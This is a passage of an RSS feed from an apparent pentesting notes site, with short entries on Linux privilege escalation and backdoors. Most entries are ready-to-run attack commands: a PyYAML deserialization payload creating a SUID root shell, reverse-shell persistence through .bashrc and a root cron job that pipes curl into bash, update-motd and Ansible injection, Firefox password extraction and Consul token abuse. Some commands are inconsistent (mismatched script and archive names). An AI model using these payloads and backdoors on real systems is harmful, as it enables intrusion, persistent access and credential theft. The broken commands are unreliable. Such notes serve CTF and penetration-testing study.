      <description>If we faced the Python script as follow, we cannot use common modules used for escalating privileges (&amp;ldquo;os&amp;rdquo;, &amp;ldquo;system&amp;rdquo;, etc.).&#xA;It appeared in Newbie CTF 2019.&#xA;#! /usr/bin/python3 def main(): text = input(&amp;#39;&amp;gt;&amp;gt; &amp;#39;) for keyword in [&amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;import&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;read&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;write&amp;#39;]: if keyword in text: print(&amp;#34;No!!!&amp;#34;) return else: exec(text) if __name__ == &amp;#34;__main__&amp;#34;: main() We need to modify module names to allow us to execute them.</description>
    </item>
    <item>
      <title>Python Yaml Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</guid>
      <description>Investigation link import yaml filename = &amp;#34;example.yml&amp;#34; yaml.load() Payloads link import yaml from yaml import Loader, UnsafeLoader data = b&amp;#39;!!python/object/new:os.system [&amp;#34;cp `which bash` /tmp/bash;chown root /tmp/bash;chmod u&amp;#43;sx /tmp/bash&amp;#34;]&amp;#39; yaml.load(data) yaml.load(data, Loader=Loader) yaml.load(data, Loader=UnsafeLoader) yaml.load_all(data) yaml.load_all(data, Loader=Loader) yaml.load_all(data, Loader=UnsafeLoader) yaml.unsafe_load(data) Now execute the bash in privilege mode.&#xA;/tmp/bash -p Reverse Shell linkStart a listener in local machine.&#xA;nc -lvnp 1234 Then execute Python script that contains the following YAML code as root.</description>
    </item>
    <item>
      <title>Linux Backdoors</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-backdoors/</guid>
      <description>.bashrc linkAdd this line to /root/.bashrc or /home/&amp;lt;user&amp;gt;/.bashrc to gain access to target machine by reverse shell when the victim user logged in.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 Of course we need to always open netcat listener to be able to fetch incoming connection from the target.&#xA;nc -lvnp 4444 Cron linkAdd this line to the cron file like /etc/crontab in the target machine.&#xA;* * * * * root curl http://&amp;lt;local-ip&amp;gt;:&amp;lt;local-port&amp;gt;/shell | bash Create the “shell” file in local machine.</description>
    </item>
    <item>
      <title>Bash eq Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</link>
      <pubDate>Thu, 16 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/bash-eq-privilege-escalation/</guid>
      <description>Investigation linkPlease see this post for details.&#xA;sudo -l (root) /bin/bash /opt/example.sh If we can execute above command as root, and the /opt/example.sh contains the numeric comparison such as [[ $var -eq 42 ]], we can execute arbitrary command.&#xA;#!/bin/bash read -rp &amp;#34;Enter guess: &amp;#34; num if [[ $num -eq 42 ]] then echo &amp;#34;Correct&amp;#34; else echo &amp;#34;Wrong&amp;#34; fi To execute arbitrary command, answer this question as below.&#xA;sudo /bin/bash /opt/example.</description>
    </item>
    <item>
      <title>Ansible Playbook Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</link>
      <pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ansible-playbook-privilege-escalation/</guid>
      <description>PrivEsc with Tasks linkFirst off, check the content of playbook in /opt/ansible/playbooks.&#xA;For instance, a file named “httpd.yaml”.&#xA;- name: Install and configure Apache ... roles: - role: geerlingguy.apache tasks: - name: configure firewall firewalld: ... Next, check the content of configure files in /opt/ansible/roles/geerlingguy.apache/tasks.&#xA;And add the exploitable file in this.&#xA;For example, a file named “shell.yml”.&#xA;- hosts: localhost tasks: - name: RShell command: sudo bash /tmp/root.sh Create a exploit for reverse shell.</description>
    </item>
    <item>
      <title>Chrome Remote Debugger Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</link>
      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/chrome-remote-debugger-pentesting/</guid>
      <description>Investigation link /usr/bin/google-chrome --remote-debugging-port=12345 If the target system is running Google Chrome Debugger with specific port, we can port forward and may be able to retrieve sensitive data in browser debugging mode.&#xA;Exploitation link1. Port Forwarding linkFirst off, start port forwarding in local machine.&#xA;ssh -L 12345:127.0.0.1:12345 remote-user@example.com 2. Configure Network Targets in Chrome linkAssume the chrome debugger is running on port 12345.&#xA;Open Chrome browser and input the following string in URL bar at the top of the window.</description>
    </item>
    <item>
      <title>OpenSSL Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</link>
      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/openssl-privilege-escalation/</guid>
      <description>Privilege Escalation (SUID) linkReference: https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/&#xA;1. Get Capabilities linkChack capabilities in the target machine.&#xA;# -r: recursive getcap -r / 2&amp;gt;/dev/null If you see the openssl has the capability set as below, you can successfully exploit it.&#xA;/usr/bin/openssl = cap_setuid&amp;#43;ep 2. Create the Exploit in C linkIn local machine, you need to have “libssl-dev” to use the header file named “openssl/engine.h” in the exploit.&#xA;If you don&amp;rsquo;t have it yet, install it.</description>
    </item>
    <item>
      <title>Apache Conf Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/apache-conf-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/apache2 -rwxrwxrwx 1 root root 7094 NOV 7 2023 apache2.conf If we can modify the apache configuration file, we can update the web owner (www-data) to arbitrary user.&#xA;Exploitation link1. Update Apache.Conf linkFirst modify “apache.conf” file to change the web user with new one.&#xA;# These need to be set in /etc/apache2/envvars User www-data Group www-data 2. Insert Reverse Shell Script linkIn the web directory (e.g. /var/www/html), create the script to reverse shell.</description>
    </item>
    <item>
      <title>Doas Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</link>
      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/doas/</guid>
      <description>Investigation linkFirst of all, search location of doas.conf.&#xA;find / -type f -name &amp;#34;doas.conf&amp;#34; 2&amp;gt;/dev/null Next check the configuration.&#xA;doas -C /path/to/doas.conf doas -C /etc/doas.conf # or cat /etc/doas.conf Execute doas as below.&#xA;doas -u root &amp;lt;command&amp;gt; &amp;lt;arg&amp;gt; Please also refer to GTFOBins to PrivEsc.</description>
    </item>
    <item>
      <title>Update-Motd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</link>
      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/update-motd-privilege-escalation/</guid>
      <description>Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.&#xA;Exploitation linkRun the following code to copy bash binary and give suid to this file.&#xA;Replace &amp;lt;username&amp;gt; with your current user name.&#xA;echo &amp;#34;cp /bin/bash /home/&amp;lt;username&amp;gt;/bash &amp;amp;&amp;amp; chmod u&amp;#43;s /home/&amp;lt;username&amp;gt;/bash&amp;#34; &amp;gt;&amp;gt; /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.</description>
    </item>
    <item>
      <title>Snapd Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</link>
      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/snapd-privilege-escalation/</guid>
      <description>dirty_sock (CVE-2019-7304) Version &amp;lt; 2.37 linkReference: https://www.exploit-db.com/exploits/46361</description>
    </item>
    <item>
      <title>Mozilla Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</link>
      <pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/mozilla-pentsting/</guid>
      <description>Extract Passwords from Firefox Profile link1. Transfer the .firefox Directory link Zip&#xA;First, zip .firefox directory in target machine, and open web server to transfer the zip file to local machine.&#xA;zip -r /tmp/firefox.zip .firefox cd /tmp python3 -m http.server 8000 In local machine, download the zip file from the remote machine, and decompress it.&#xA;wget http://&amp;lt;target-ip&amp;gt;:8000/mozilla.zip unzip mozilla.zip Tar&#xA;If we cannot use zip, tar also can be used.</description>
    </item>
    <item>
      <title>LXC/LXD (Linux Container/Daemon) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</link>
      <pubDate>Mon, 30 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/container/lxc-lxd-privilege-escalation/</guid>
      <description>Basic Flow link Check if You are in the Lxd Group&#xA;If you belong to the Lxd group, you may be able to the root privileges.&#xA;groups id Check if Container Image Exists&#xA;List all images and check if a container image already exists.&#xA;lxc image list If there are not container, build a new image in your local machine.&#xA;git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder sudo ./build-alpine python3 -m http.server 8000 In remote machine, download the “alpine-*.</description>
    </item>
    <item>
      <title>MicroK8s Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</link>
      <pubDate>Sat, 28 Jan 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/container/kubernetes/microk8s-pentesting/</guid>
      <description>Ports and Services link Port 10250 - kubelet Port 10255 - kubelet (read only) Port 10257 - kube-controller Port 10259 - kube-scheduler Port 16443 - API server Port 25000 - cluster-agent Port 32000 - Docker registry Docker Registry (port 32000) linkIt is the same as Docker Registry Pentesting .&#xA;Investigation from Inside link # Version snap info microk8s Privilege Escalation (CVE-2019-15789) ≤ 1.15.2 linkSee the post for details.&#xA;1. Create a Pod Yaml File linkReplace the value of spec.</description>
    </item>
    <item>
      <title>HashiCorp Consul Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</link>
      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</guid>
      <description>Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.&#xA;First, create a script which changes the permission of ‘bash’.&#xA;echo &amp;#39;chmod &amp;#43;s /usr/bin/bash&amp;#39; &amp;gt; /tmp/exploit.sh Then curl.&#xA;curl --header &amp;#34;X-Consul-Token: &amp;lt;ACL-TOKEN&amp;gt;&amp;#34; --request PUT -d &amp;#39;{&amp;#34;ID&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;Port&amp;#34;: 80, &amp;#34;check&amp;#34;: {&amp;#34;Args&amp;#34;: [&amp;#34;/usr/bin/bash&amp;#34;, &amp;#34;/tmp/e.sh&amp;#34;], &amp;#34;interval&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;timeout&amp;#34;: &amp;#34;1s&amp;#34;}}&amp;#39; http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token &amp;lt;ACL-TOKEN&amp;gt; key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data </description>
    </item>
  </channel>
</rss>
